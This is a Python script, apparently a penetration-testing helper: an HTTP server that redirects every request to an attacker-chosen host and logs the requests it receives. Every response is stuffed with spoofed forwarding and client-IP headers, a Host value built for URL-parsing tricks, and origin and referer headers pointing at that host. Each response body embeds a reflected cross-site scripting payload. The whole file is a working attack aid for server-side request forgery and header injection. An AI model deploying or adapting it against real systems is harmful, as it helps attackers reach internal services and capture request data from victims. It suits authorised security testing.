#!/usr/local/bin/python3

# Web server to respond with 302 - plus verbose logging to stdout

#!/usr/bin/env python3
'''
Usage::
    ./redir.py [<port>] [<redirect-host>] [<return-code>]
'''

from http.server import BaseHTTPRequestHandler, HTTPServer
from http.client import parse_headers
import logging
import sys

class S(BaseHTTPRequestHandler):
    def _set_response_redir(self):
        if len(sys.argv) > 3:
            if sys.argv[3]:
                response_code = int(sys.argv[3])
        else:
            response_code = 302
        if len(sys.argv) > 2:
            if sys.argv[2]:
                redir_location = sys.argv[2]
        else:
            redir_location = 'http://localhost'
        self.send_response(response_code)
        self.send_header("Host","{}:80@%h".format(redir_location))
        self.send_header("Contact","root@{}".format(redir_location))
        self.send_header("From","root@{}".format(redir_location))
        #self.send_header("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@{}".format(redir_location))
        self.send_header("Referer","http://{}/ref".format(redir_location))
        self.send_header("X-Original-URL","http://{}/".format(redir_location))
        self.send_header("X-Wap-Profile","http://{}/wap.xml".format(redir_location))
        self.send_header("Profile","http://{}/wap.xml".format(redir_location))
        self.send_header("X-Arbitrary","http://{}/".format(redir_location))
        self.send_header("X-HTTP-DestinationURL","http://{}/".format(redir_location))
        self.send_header("X-Forwarded-Proto","http://{}/".format(redir_location))
        self.send_header("Origin","http://{}".format(redir_location))
        self.send_header("X-Forwarded-Host","{}".format(redir_location))
        self.send_header("X-Forwarded-Server","{}".format(redir_location))
        self.send_header("X-Host","{}".format(redir_location))
        self.send_header("Proxy-Host","{}".format(redir_location))
        self.send_header("Destination","{}".format(redir_location))
        self.send_header("Proxy","http://{}".format(redir_location))
        self.send_header("Via","1.1 {}".format(redir_location))
        self.send_header("X-Forwarded-For","spoofed.{}".format(redir_location))
        self.send_header("True-Client-IP","spoofed.{}".format(redir_location))
        self.send_header("Client-IP","spoofed.{}".format(redir_location))
        self.send_header("X-Client-IP","spoofed.{}".format(redir_location))
        self.send_header("X-Real-IP","spoofed.{}".format(redir_location))
        self.send_header("X-Originating-IP","spoofed.{}".format(redir_location))
        self.send_header("CF-Connecting_IP","spoofed.{}".format(redir_location))
        self.send_header('Location', 'http://{}'.format(redir_location))
        self.end_headers()

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        headers = str(self.headers)
        self._set_response_redir()
        
        self.wfile.write("GET request for {}. \"'><script>alert(document.domain)</script>".format(self.path).encode('utf-8'))
        

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response_redir()
        self.wfile.write("POST request for {} \"'><script>alert(document.domain)</script>".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) >= 2:
        run(port=int(argv[1]))
    else:
        run()
